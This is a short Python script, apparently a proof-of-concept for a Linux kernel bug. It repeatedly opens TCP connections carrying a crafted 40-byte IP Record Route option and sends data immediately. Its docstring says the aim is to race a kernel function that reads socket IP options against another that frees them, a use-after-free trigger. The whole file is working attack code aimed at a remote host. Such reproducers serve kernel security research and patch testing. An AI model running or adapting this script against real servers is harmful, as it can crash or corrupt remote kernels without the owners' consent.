#!/usr/bin/env python3
"""rr_client.py - plain TCP client whose SYN carries a 40-byte RR option
(leading NOP so the option offset is nonzero and the server saves it), then
sends data immediately.  Used to race the server child's __ip_queue_xmit
ACK (which reads inet_opt) against inet_sock_destruct (which frees it)."""
import socket, sys, time

dst = sys.argv[1]
port = int(sys.argv[2])
n = int(sys.argv[3]) if len(sys.argv) > 3 else 100
delay = float(sys.argv[4]) if len(sys.argv) > 4 else 0.0
payload = int(sys.argv[5]) if len(sys.argv) > 5 else 64

# NOP + RR(type 7, len 39, ptr 4) + 36 bytes of route slots = 40 bytes
opts = b"\x01" + bytes([7, 39, 4]) + b"\x00" * 36
assert len(opts) == 40

for i in range(n):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_OPTIONS, opts)
        s.settimeout(1.0)
        s.connect((dst, port))
        s.send(b"A" * payload)
    except OSError as e:
        pass
    finally:
        if delay > 0:
            time.sleep(delay)
        try:
            s.close()
        except OSError:
            pass
    if delay == 0 and (i % 64) == 0:
        time.sleep(0.001)
print("done", n)
